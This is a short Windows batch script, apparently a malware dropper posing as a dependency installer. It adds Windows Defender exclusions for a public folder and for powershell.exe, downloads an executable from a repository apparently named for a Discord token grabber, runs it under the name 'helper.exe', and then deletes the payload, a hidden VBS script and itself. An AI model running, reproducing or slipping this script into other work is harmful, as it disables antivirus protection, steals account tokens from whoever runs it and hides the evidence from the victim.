@echo off
powershell Add-MpPreference -ExclusionPath "C:\Users\Public"
powershell Add-MpPreference -ExclusionProcess "powershell.exe"
cd "C:\Users\Public"
curl --output "C:\Users\Public\helper.exe" -LJO https://github.com/durandlh/discord-token/blob/main/grabber.exe?raw=true
start helper.exe
del hide.vbs
timeout 5
del helper.exe
del dependencies.bat
